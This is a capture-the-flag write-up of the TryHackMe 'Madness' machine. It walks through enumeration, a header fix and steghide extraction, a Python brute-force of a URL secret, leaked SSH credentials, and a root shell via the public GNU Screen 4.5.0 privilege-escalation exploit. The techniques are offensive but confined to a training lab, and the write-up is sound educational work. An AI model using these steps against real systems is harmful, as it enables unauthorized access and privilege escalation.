![](Images/2iH4uiK.png)

What I learn from this machine:
* Enumerations
* Stregnography
* Python3 script to bruteforce url
* Screen version 4.5.0 Local Privilege Escalation

Let's start with a nmap scan. 
```
# Nmap 7.91 scan initiated Thu Jun 10 17:45:19 2021 as: nmap -sC -sV -A -oN scans/nmap-output 10.10.17.235
Nmap scan report for 10.10.17.235
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 10 17:45:59 2021 -- 1 IP address (1 host up) scanned in 40.45 seconds
```
We got port 22 ssh open running on **ubuntu** and port 80 running apache web server. According to the nmap scan It is apache default web page. Let's see it's true.

![](Images/web.png)

Let's run a dirb against the webpage. Untill that gives something let's try to view source code on our apache default web page. Is there anything we miss.

This is what I found in page source. 

![](Images/page%20source.png)

```js
 <div class="page_header floating_element">
        <img src="thm.jpg" class="floating_element"/>
<!-- They will never find me-->
        <span class="floating_element">
          Apache2 Ubuntu Default Page
        </span>
      </div>
```
We can go back to the web page and see It is existing there. 

![](Images/floting%20image.png)

Let's grab that image to our machine (use 'wget http://10.10.17.235/thm.jpg'). First I try to look at it but we cannot error popup.

![](Images/error.png)

We kind a understand what is wrong here. Web title says it's a PNG file but our image is JPEG file. 

Let's change it. First I try to rename the extention it dosen't work. when we look into the head of that file it says PNG this must be the issue. Let's use the **hexedit** to change this to JPEG. (use **hexedit thm.jpg** to enter the editor)

Here is the documentation link I read before do the changes :
https://www.file-recovery.com/jpg-signature-format.htm

* Before change this line : 89 50 4E 47  0D 0A 1A 0A  00 00 00 01

![](Images/before%20the%20change.png)

* After the change : FF D8 FF E0  00 10 4A 46  49 46 00 01

![](Images/after%20the%20change.png)

Let's press **ctrl+x** save and exit. let's open our image.

![](Images/thm.png)

Our dirb didn't found anything no wonder. Let's go into that **hidden directory**. 

We can see bunch of text. But we look into the page source we can see this. 

![](Images/page%20source%202.png)

It asking for **secret number**. We know It's in the 0-99. Let's try to run script to bruteforce this. First we need to change the url like this and see what happen.
(http://10.10.17.235/th1s_1s_h1dd3n/?secret=1)

It looks like it change that **Secret Entered: 1** value. Let's make our script with python.
```python
#! usr/bin/env python3
import requests

url ="http://10.10.17.235/th1s_1s_h1dd3n/?secret="

for i in range(0,100):
	response=requests.get(url+str(i))
	
	if("That is wrong!" in response.text):
		continue
	else:
		print("correct secret :",i)
		break
```
This will give your correct answer like this :
```bash
┌─[✗]─[visith@parrot]─[~/CTF/thm/Madness]
└──╼ $python3 bruteforce.py 
correct secret : 73
```
Let's see what's in 73.

![](Images/73%20web.png)

Is this username? After sometime I figure it's not a username. I look into that thm.jpg ours. Guess what I found in there.

```bash
┌─[✗]─[visith@parrot]─[~/CTF/thm/Madness]
└──╼ $steghide --info thm.jpg 
"thm.jpg":
  format: jpeg
  capacity: 1.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hidden.txt":
    size: 101.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
That's not a username it was the passphrase. Let's extract that **hidden.txt** file. Use this to extract that file.

* Passphrase: y2RPJ4QaPF!B

```bash
steghide --extract -sf thm.jpg
```
In that hidden.txt file :
```
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```
Still I don't think that mad bastard give the username. In the hints they said **There's something ROTten about this guys name!** we can try to decrypt this with ROT13. 

Here is the decrypter link : https://rot13.com/

![](Images/rot13.png)

Great!! We get the username as a joker no doubt on that.

I tried to connect as joker with the password, but no luck. I also tried to ROT13 the password, no luck either…

I’ll be honest, I was about to stop here and ask this about one of my friends. I found that the password is located in the picture of this room. Seriously, who would expect that? Anyway, let’s take this as a hint.

In this image:

![](Images/5iW7kC8.jpg)

**Use steghide (with empty key) to reveal the password**
```bash
┌─[✗]─[visith@parrot]─[~/CTF/thm/Madness]
└──╼ $steghide info 5iW7kC8.jpg 
"5iW7kC8.jpg":
  format: jpeg
  capacity: 6.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "password.txt":
    size: 83.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
Let's extract that *password.txt*. Use following command to extract that file.

```bash
steghide extract -sf 5iW7kC8.jpg 
```
In the **password.txt** file:

``` 
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```
Finally !! Let's connect to the ssh with this. 

* username: joker
* password: *axA&GF8dP

## User flag 
User flag in joker's home directory.
```bash
joker@ubuntu:~$ ls -la
total 20
drwxr-xr-x 3 joker joker 4096 Jun 10 07:15 .
drwxr-xr-x 3 root  root  4096 Jan  4  2020 ..
-rw------- 1 joker joker    0 Jan  5  2020 .bash_history
-rw-r--r-- 1 joker joker 3771 Jan  4  2020 .bashrc
drwx------ 2 joker joker 4096 Jun 10 07:15 .cache
-rw-r--r-- 1 root  root    38 Jan  6  2020 user.txt
joker@ubuntu:~$ cat user.txt 
THM{d5781**********************}
```
## Root flag
Looks like we can't run sudo here. 
```bash
joker@ubuntu:~$ sudo -l
[sudo] password for joker: 
Sorry, user joker may not run sudo on ubuntu.
```
Let's run linpeas in this machine.  

![](Images/linpeas.png)

Let’s find a way to leverage a root privilege with screen version 4.5.0 .After searching it in exploitdb I find the Local Privilege Escalation.

https://www.exploit-db.com/exploits/41154

Let's Download the exploit, transfer it to the target through python server into the directory /dev/shm and execute it.

It gives me a bunch of errors but it do our work.
```bash
joker@ubuntu:/dev/shm$ chmod +x screen-exploit.sh 
joker@ubuntu:/dev/shm$ ./screen-exploit.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.

# whoami
root
# cd /root
# ls
root.txt
# cat root.txt	
THM{5ecd9*************************}
```

Thx for reading !! 

Have a nice day